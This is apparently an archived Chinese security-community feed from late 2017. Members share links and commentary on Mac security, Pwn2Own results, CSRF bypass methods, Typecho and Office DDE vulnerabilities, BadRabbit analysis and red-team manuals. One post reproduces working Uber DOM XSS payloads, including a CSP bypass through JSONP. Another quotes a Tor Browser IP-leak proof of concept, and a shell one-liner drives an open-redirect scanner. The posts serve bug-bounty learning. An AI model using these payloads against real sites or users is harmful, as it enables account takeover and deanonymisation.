# SST 2017

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__ on 2017-11-01:

Mobile Pwn2own 第一天(2017年11月1日)比赛结果

<img src="https://file.xiaomiquan.com/138/12/3812b59dea04a7da2d33a5f0be309d0631fb6cd827bf679e0ff41265adeb5899.png" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 可以买多少台 Mac 了？


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-11-01:


__#资源#__

  关于 Mac 电脑的隐私与安全，给大家分享个很赞的指南：


[GitHub - drduh/macOS-Security-and-Privacy-Guide: A...](https://github.com/drduh/macOS-Security-and-Privacy-Guide)



点进去别害怕，里面可以找到中文版:)

Mac 本身的安全起跑线挺高的，但是其安全生态也可以很脆弱，建议用 Mac 的同学们掌握这些技巧，真不费劲。

如果你们感兴趣 Mac 下的隐私与安全话题，后续我可以做些自己的经验分享，支持不支持？

没 Mac 的同学，可以考虑入手一台，这个世界上最好用的两台电脑，一台是 Mac，另一台是 ThinkPad，因为那个小红点，脱离鼠标是多重要的一件事...



...

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__: 贫穷限制了我用mac🙈

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__ replies to <img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__: 我的第一任就是thinkpad，可以当时不知道它的珍贵[委屈]

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__: [捂脸]

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__: 保护默认安装的Mac  比如Gatekeeper  XProtect FileVaultSandboxing   
[Securing a default installation of MacOS – n00py B...](https://www.n00py.io/2017/06/securing-a-default-installation-of-macos/)



<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__: 坐等公司发Mac[微笑]

<img src="https://file.xiaomiquan.com/93/c0/93c0afcee1823a8215ad5307e444fe8d8eb054e940fd1f4a94b6d99df4d2b9c2.jpg" width="25px"/> __心态决定人生__ replies to <img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__: 搞台二手[呲牙]

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 穷逼只能用用黑苹果了


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-31:


__#姿势#__

 从 Uber DOM XSS 案例看到的几个点

给大家来个简单解读吧，首先是这篇 Uber DOM XSS 发现过程 Write-up：

[https://stamone-bug-bounty.blogspot.fr/2017/10/dom-xss-auth_14.html](https://stamone-bug-bounty.blogspot.fr/2017/10/dom-xss-auth_14.html)



触发：


[Uber](https://auth.uber.com/login/?next_url=data:accounts.uber.com;text/html;charset=UTF-8,)

<html><script>window.location="
[reddit: the front page of the internet](https://reddit.com)

";</script></html>&state=x

依靠的是 data: 这个伪协议，这个伪协议背后添加的 accounts.uber.com 字符串是用于 Uber 后端过滤检查绕过的（可以想象 Uber 的后端过滤检查机制很单一）。

之后作者又做了第二次绕过，针对的是 CSP 保护机制，这个保护机制绕过的经典技巧是白名单域下的 JSONP XSS 引入：


[Uber](https://auth.uber.com/login/?next_url=data:accounts.uber.com;text/html;charset=UTF-8,)

<html><script src="
[https://app-lon02.marketo.com/index.php/form/getKnownLead?callback=alert(document.domain);//"](https://app-lon02.marketo.com/index.php/form/getKnownLead?callback=alert(document.domain);//")

 data-reactid="341"></script></html>&state=x

不过这里需要注意的是 data: 协议这种写法技巧可能只适用于 Firefox 浏览器。

然后是相关的两个资源：

Open Url Redirects

[https://zseano.com/tutorials/1.html](https://zseano.com/tutorials/1.html)



还有个是 qz 前两天在本圈分享的一个跳转漏洞测试工具：


[GitHub - ak1t4/open-redirect-scanner: open redirec...](https://github.com/ak1t4/open-redirect-scanner)



这个工具代码极少，原理很简单请自行阅读，运行技巧也很 Unix:)，如下：

while read -r line;do python redirect.py.1 uber.list $line;done < payloads.list

最后，把上面这些经验仔细吸收后，这种漏洞是可以自动化挖掘的，奖金属于勤劳的人们:)



...

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__: 运行不方便，而且执行速度也慢。打算改一改用法，再改成多线程。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__: 支持


...

---

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__ on 2017-10-31:

GoCrack是FireEye的ICE团队发布的一款工具，是基于Web的高效地管理多个GPU服务器上的密码破解任务，如创建，查看和管理。

[GitHub - fireeye/gocrack](https://github.com/fireeye/gocrack)





---

<img src="https://file.xiaomiquan.com/53/93/5393f85d981fdca80d89f411c1db56b464ad0512f3e49b0e88bfc2ce40916a62.jpg" width="25px"/> __RAY__ on 2017-10-31:

scapy加了个Krack AP module ：）


[Krack AP module by commial · Pull Request #928 · s...](https://github.com/secdev/scapy/pull/928)





---

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__ on 2017-10-31:

利用NFS配置错误来提权  
  
[Linux privilege escalation using weak NFS permissi...](https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/)





---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-31:


__#工具#__

  Empire 2.3 发布


[Empire/changelog at master · EmpireProject/Empire ...](https://github.com/EmpireProject/Empire/blob/master/changelog)

 

就是做了不少 fix，主要功能变化还是要等 3.0 这个大版本。嗯，之前说过。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-30:


__#姿势#__

  绕过 CSRF 保护的10种方法


[10 Methods to Bypass Cross Site Request Forgery (C...](https://haiderm.com/10-methods-to-bypass-cross-site-request-forgery-csrf/)

 

我补充几个：

1. CORS 这个跨域资源共享技巧
2. Referer 泄露 token 技巧
3. 多个 CSRF 结合技巧
4. 如果要提 Flash，还有 XFS 及 XFS 反射技巧
5. 大家来脑洞补充吧:)



...

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__: 补充个hash识别的小工具，识别token的时候可以用的上(
[https://github.com/AnimeshShaw/Hash-Algorithm-Identifier)](https://github.com/AnimeshShaw/Hash-Algorithm-Identifier))

。另外，也可以使用burp的sequencer功能分析。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__: 不错

<img src="https://file.xiaomiquan.com/41/b3/41b36482e50df589c1aab96bf02cc26f84715aecfb4ab94cff73436a248938a7.jpg" width="25px"/> __剑思庭__: 这个不错

<img src="https://file.xiaomiquan.com/bd/87/bd872d6bf8f2e37a8687398bc1bc0af07f9b896fc43c3663a77f830db1ac4c5c.jpg" width="25px"/> __ken🐜__ replies to <img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__: 404了？手机上看404


...

---

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ on 2017-10-29:


__#姿势#__


__#代码审计#__

 
tyecho getshell 这个漏洞不知道各位有没有关注，最近几天刷的挺多的。我认为这是一个非常好的学习php反序列化漏洞的案例，建议大家仔细研究，最好独立把poc写出来。

[Typecho 事件始末](https://mp.weixin.qq.com/s/IE9g6OqfzAZVjtag-M_W6Q)



[Typecho 前台 getshell 漏洞分析](https://paper.seebug.org/424/)



[新手分析typecho 反序列化漏洞 | 江sir's blog](http://www.blogsir.com.cn/safe/454.html)


此外，我自己画了个相当简洁的mindnode图，大家凑合凑合看，希望有用。

<img src="https://file.xiaomiquan.com/1a6/30/a630ce206694d69b4b620fe648854769733492d350e2b525f62daa4d22eee999.png" width="50%" height="50%" align="middle"/>

__分享文件:__
[typecho.mindnode.zip](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


---

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ on 2017-10-28:

周末来一发 红队手册~


__分享文件:__
[rtfm-red-team-field-manual.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 很干

<img src="https://file.xiaomiquan.com/3a/75/3a759eaba8d7bbf02a326049dd7d19d00f0823f4a3e3191631c8bf6a9217c938.jpg" width="25px"/> __.X__: 没了解过红蓝队，圈子里有相关的贴吗？

<img src="https://file.xiaomiquan.com/9a/06/9a060c31e7556da8418e4c6d9de5229328b198d85984bd279ceb76bc98108db9.jpg" width="25px"/> __Tr＠cer_0x06lA__: 这是什么呀？求科普

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__: 坐等蓝队手册哈哈哈

<img src="https://file.xiaomiquan.com/31/b6/31b6586a32515d09f2da0a1509c60c36213c8568619e11232e37c85ad4fb675b.jpg" width="25px"/> __天行者__: 道客巴巴上有在线版（134页）

[RTFM Red Team Field Manual - 其它资料 - 道客巴巴](http://www.doc88.com/p-4109036491534.html)




...

---

<img src="https://file.xiaomiquan.com/53/93/5393f85d981fdca80d89f411c1db56b464ad0512f3e49b0e88bfc2ce40916a62.jpg" width="25px"/> __RAY__ on 2017-10-27:

跳转漏洞测试，payload不错和测试方法不错，来一批域名群测一下，刷爆Src ：）


[GitHub - cujanovic/Open-Redirect-Payloads: Open Re...](https://github.com/cujanovic/Open-Redirect-Payloads)



[GitHub - ak1t4/open-redirect-scanner: open redirec...](https://github.com/ak1t4/open-redirect-scanner)





...

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: Mark.

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__: 跟着茄牛的步伐，刷src第一[奸笑]


...

---

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__ on 2017-10-27:

这几天dde攻击挺火的，在国内很少看到讨论，我自己学习了测试了下，整理了一个文章。


__分享文件:__
[Ms office DDE攻击与防御.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


...

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 这个真的是杀伤力很大的

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 赞

<img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__: 赞

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 讨论的挺多的啊，我的问题就是。怎么改窗口提示文字，还要点两次确认，原文这个问题不知道我看没看懂，能让他不弹窗就美了。

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 微软暂时不修复这个，意思好像是影响不大。😂

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__ replies to <img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 提示只能改的迷惑点，弹出的窗口无法改变。

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 我用qq邮箱收件时图片和DDE变成了DAT附件，没法执行，用网易邮箱可以正常执行。问题是过程中要弹出三个对话框，如果用户习惯性地点否或者关闭，那么成功概率很低啊。

<img src="https://file.xiaomiquan.com/06/80/0680db16c9c7b01e0339fde36284b22a6883bda247cdabb58ed9c92235fa2f3c.jpg" width="25px"/> __英雄马__: 向三爷的势力低头！


...

---

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__ on 2017-10-27:

McAfee Labs分析最新的Office漏洞 CVE-2017-11826

[Analyzing Microsoft Office Zero-Day Exploit CVE-20...](https://securingtomorrow.mcafee.com/mcafee-labs/analyzing-microsoft-office-zero-day-exploit-cve-2017-11826-memory-corruption-vulnerability)





---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-27:


__#漏洞#__

  Linux TBB SFTP URI 会导致 Tor 浏览器泄露真实 IP

这个漏洞技巧挺有趣的，值得参考，虽然应该修复了。


[#253429 Linux TBB SFTP URI allows local IP disclos...](https://hackerone.com/reports/253429)

 

过程：

Browsing to a simple URL to an sftp URI allows bypasses socks proxy for DNS and browsing.
Tested on a clean install of Ubuntu 16.04 with TBB 7.0.2 (4097d43aa0be86ae3fe43ec8f3ac5394) download from 
[404 Not Found](https://www.torproject.org/dist/torbrowser/7.0.2/tor-browser-linux64-7.0.2_en-US.tar.xz)



POC:
Navigate to s
[ftp://104.131.180.179:80/index.php](ftp://104.131.180.179:80/index.php)



After ~1 minute check 
[502 - No server or forwarder data received (Privoxy@localhost)](http://104.131.180.179/ip,txt)

 for your IP address

It appears that ubuntu's default SSH client is associated with this URI which causes the client to attempt the connection on behalf of the user. The windows TBB does not appear to be affected.

Excerpt from apache logs:
apache2: [core:error] [pid 10671] [client x.x.x.x:40063] AH00126: Invalid URI in request SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.1

Not surprisingly, the client can also be directed to local resources as well.



...

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: ga专用。哈哈


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-26:

> 匿名用户 提问：
余弦大大，之前咨询过你，以前一直在搞WEB想接触更深的渗透测试，直接买了本Metasploit魔鬼训练营开始干，发现自己对书用的内容不怎么看得懂，主要是那些遇到不同情况对payload 进行修改。我是不是少了些什么储备。开发语言学过python。计算机相关知识，停留在大学的课程水平。我该怎样提升。我想遨游内网。有点迷茫。


把二进制能力入门下，之前圈子内有说过。你还想遨游内网，不多说，你把域控这生态搞懂先（虽然不是什么内网都有微软那套域控）。

其实我这样回答意义不大，这类问题圈子好多，多说一句吧：黑客超能力之所以那么令人神往，是因为这确实不是件容易的事。我敢这样去说，那是我都玩了多少年了...

好好沉淀吧。



...

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 遨游内网，有一点，你必须知道内网是怎么管理的呀，系统 域 网络管理  各种服务配置管理 都少不了。

<img src="https://file.xiaomiquan.com/34/67/34670901cfe95bb707b2e89bf45d6b8f30fd46af445923331ac80a871991f14b.jpg" width="25px"/> __咯吱咯__: 个人建议，能看懂就看懂，看不懂尽量搞懂，别死磕，然后找些受权或者自己搭建个虚拟机，照葫芦画瓢。尽量还原书里面的场景，实在不行就直接过……命令操作下，别一下子就想全记住搞懂，这些留个印象后，再搞其他的把渗透在脑海中有个大概印象，觉得可以实战的时候……如果如果在某个阶段需要使用某个工具列如msf，然后在进行这方面的继续探查使用，深入，不至于走入死角……有些东西知识面扩大了你才能明白，并不是所谓的精通……多看些不同的书……虽然比不上直接实践……但是……还是有点用的……再然后自己慢慢取的平衡，不是一味的相信某个书……某个教程……等等……照葫芦画瓢虽然进步快点……但是没得自己找材料画的好……个人想法……

<img src="https://file.xiaomiquan.com/74/5e/745edea4e49022b74099ca16e653b7177e9ea16ff8e52cc8b1a950dfb835406c.jpg" width="25px"/> __Tsinghua&MIT__: 内网、域、网络管理……怎么越听越像我们搞运维平时搞的事呢

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/74/5e/745edea4e49022b74099ca16e653b7177e9ea16ff8e52cc8b1a950dfb835406c.jpg" width="25px"/> __Tsinghua&MIT__: 本来呀，黑客就没什么神秘

<img src="https://file.xiaomiquan.com/88/ba/88baf27d18a55ca81cb25b0279ab02127bac65f1d2a9cdfbc724c0cf7512f7e9.jpg" width="25px"/> __In&eRes7ing__: 突然特别想知道微博上的日娃大神是怎么找0day，怎么追踪黑客组织的。这要学多少东西[捂脸]

<img src="https://file.xiaomiquan.com/52/c3/52c3d5d2f67ba3f62da9ea554ec44576eb95ad4c89705ae3bd6de57799d53e5b.jpg" width="25px"/> __phoenix__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 像运维一样神不知鬼不觉才是最佳效果


...

---

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__ on 2017-10-26:

endgame团队画的BadRabbit恶意软件的执行流程图，还是挺炫酷呢哈


[BadRabbit Technical Analysis | Endgame](https://www.endgame.com/blog/technical-blog/badrabbit-technical-analysis)



<img src="https://file.xiaomiquan.com/5a/69/5a69a8da5c7577bad80db00b921f1128fc71747003ed09872fbd6dd4bd00a4f2.jpg" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这是一图胜千言

<img src="https://file.xiaomiquan.com/41/b3/41b36482e50df589c1aab96bf02cc26f84715aecfb4ab94cff73436a248938a7.jpg" width="25px"/> __剑思庭__: 如果需要坏兔子的种子，我可以提供


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-24:


__#讨论#__

  苹果的安全生态真是堪忧。我举几个例子吧：1. 对于 ARP 这类中间人攻击毫无反抗之力；2. Mac 上安装的不可信第三方应用出问题了都很难有感知，基本没听说谁安装了 Mac 上的安全防御软件（有，但是这成为专业人士的东西）；3. 刚刚微博上发的那个 Wi-Fi 假关闭之坑；4. 之前我发现的某知名 App 本地 XSS 会让目标毫无抵抗之力；5. 一些猥琐脚本攻击，在苹果生态有奇效。

我举这些例子不是说苹果安全生态一无是处，而是苹果的傲慢导致其生态里的用户默认过于信任苹果生态的安全，真出问题那就是毁灭级的。苹果在对抗越狱、权限控制、隐私安全等方面确实下了很多苦力，但其傲慢的本性，一定会让自己在未来变得很被动。希望不要最终走向“宿命已定”的悲催状态吧。

大家有什么看法可以来讨论讨论。



...

<img src="https://file.xiaomiquan.com/d0/9b/d09be42dca6da1cd2e393da9bf83693bc0fec1c7b7973571e760bda8af5f738b.jpg" width="25px"/> __葫芦娃__: 说的对啊！

<img src="https://file.xiaomiquan.com/e9/f2/e9f2245d601bfd0319b7a093704e9190d027166605b608aadba0f8c034dd8353.jpg" width="25px"/> __Eeyore__: 可以推荐下os x上的安全防御软件[微笑]

<img src="https://file.xiaomiquan.com/d4/f6/d4f664b0c403a9b1a5919d7e5aa4a31ba6d4548df5c0e9da17ed682204d8910d.jpg" width="25px"/> __召唤大蟒蛇的男性火系矮人法师__: 哪天能分享一下“猥琐的脚本攻击”吗，我很感兴趣

<img src="https://file.xiaomiquan.com/d8/d1/d8d1c9ff6197408b89a2410bed5f88db4aac1428fdd8bae99c9d0d28511b7767.jpg" width="25px"/> __PI31__: 突然很好奇苹果的安全工程师是不是对于猥琐脚本攻击表示很不屑？[发呆]

<img src="https://file.xiaomiquan.com/73/46/7346088fcbd428bef2055102b2eb708048b824a0e3a18a369d5c40ef3265e14c.jpg" width="25px"/> __TomW__: 那个WiFi假关闭  简直了！也不更新

<img src="https://file.xiaomiquan.com/58/e0/58e0e911c15f99cfb8994d9f484be21c5966b3c50e4241e5e2617599f157c67c.jpg" width="25px"/> __5u9ar__: 说实在的 做开发用苹果主要是为了少折腾


...

---

<img src="https://file.xiaomiquan.com/57/49/5749fefd038db1a8926a9b98e904282b730fd5030a50cca7ecf93deeb6520c95.jpg" width="25px"/> __狗汪汪__ on 2017-10-24:

网易又进入了一个雷人的领域：情趣用品。产品名字也很那个：比如一款女性成人用品叫做“在云端”、中年男性延时安全塑料名为“996”（久久留). 哈哈 期待以后 成千上万的 棒棒 对我们家里的微波炉进行DDOS的大新闻[鼓掌]

<img src="https://file.xiaomiquan.com/67/25/6725ff84380f6f37c92f0dd8dfba91d5e08e61879204854b21a0c04784afe740.jpg" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 情趣用品专家，哦安全专家

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 哈哈

<img src="https://file.xiaomiquan.com/57/49/5749fefd038db1a8926a9b98e904282b730fd5030a50cca7ecf93deeb6520c95.jpg" width="25px"/> __狗汪汪__: 

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 大佬都这么可怕的吗？


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-24:


__#资源#__

  推荐安全客季刊第三期

内容包含：软件安全、BlackHat、漏洞分析、木马分析、安全研究、安全运营。

511 页不是件简单的事。


__分享文件:__
[security-geek-2017-q3.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


...

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 用心了

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 谁可以帮忙把本圈的精华整理个2017集合，我们会很感激😋

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 做成ppt可以么。

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: [白眼]你们平时都没时间的么

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: pdf/html方便传播，而且美观

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 创业苦逼呀，忙得要死

<img src="https://file.xiaomiquan.com/c0/2f/c02f902dc8a3e47aca0835543c7d643ae0f26dd086da142f7e6c8fd8fc05d053.jpg" width="25px"/> __coder__: [捂脸]资源打包么  主要评论有的也有些干货

<img src="https://file.xiaomiquan.com/6f/26/6f26f50dfa361fc2967683dc5ec6c59eb715511dfeb0f6985900ac985d3d0ec5.jpg" width="25px"/> __王布斯__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: gitbook那种形式就行吧

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/6f/26/6f26f50dfa361fc2967683dc5ec6c59eb715511dfeb0f6985900ac985d3d0ec5.jpg" width="25px"/> __王布斯__: 也行呀

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/c0/2f/c02f902dc8a3e47aca0835543c7d643ae0f26dd086da142f7e6c8fd8fc05d053.jpg" width="25px"/> __coder__: 工作量其实不小，主要是还要分类，排版，哈哈，

<img src="https://file.xiaomiquan.com/eb/53/eb53a8909d2f0bfd345e71bfcc6b322fcd6e50c7ad2d00fc6eda5c3aa8b09c60.jpg" width="25px"/> __浩宇__: 可以吗 我有点感兴趣。觉得做gitbook 不错   但又担心做了会不会就没人付费进这个圈子了  而且有些东西会不会造成侵权什么的

<img src="https://file.xiaomiquan.com/43/75/43758f94b2117e0c90d9296c788197e13dfbdc4697b0e9bf77554487bec2b3e7.jpg" width="25px"/> __。东__: 还是学生，大把时间[呲牙]


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-24:


__#资源#__

  推荐安全客季刊第三期

内容包含：软件安全、BlackHat、漏洞分析、木马分析、安全研究、安全运营。

511 页不是件简单的事。


__分享文件:__
[security-geek-2017-q3.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


...

